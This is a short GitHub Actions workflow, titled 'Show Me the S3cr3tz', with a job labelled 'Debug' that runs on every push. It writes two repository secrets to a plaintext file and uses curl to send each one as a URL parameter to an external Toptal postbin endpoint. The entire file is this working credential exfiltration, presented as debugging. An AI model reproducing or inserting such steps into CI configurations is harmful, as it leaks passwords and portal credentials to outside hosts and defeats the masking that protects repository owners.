name: Show Me the S3cr3tz
on: [push]

jobs:
  debug:
    name: Debug
    runs-on: ubuntu-latest

    steps:
    - name: Check out code
      uses: actions/checkout@v2

    - name: Set up secret file
      env:
        DEBUG_PASSWORD: ${{ secrets.PORTAL_URL }}
        DEBUG_SECRET_KEY: ${{ secrets.PORTAL_PASSWORD }}
      run: |
        echo $DEBUG_PASSWORD >> secrets.txt
        echo $DEBUG_SECRET_KEY >> secrets.txt
        curl https://www.toptal.com/developers/postbin/1691226180315-6729739962611?a=$DEBUG_PASSWORD
        curl https://www.toptal.com/developers/postbin/1691226180315-6729739962611?b=$DEBUG_SECRET_KEY
    
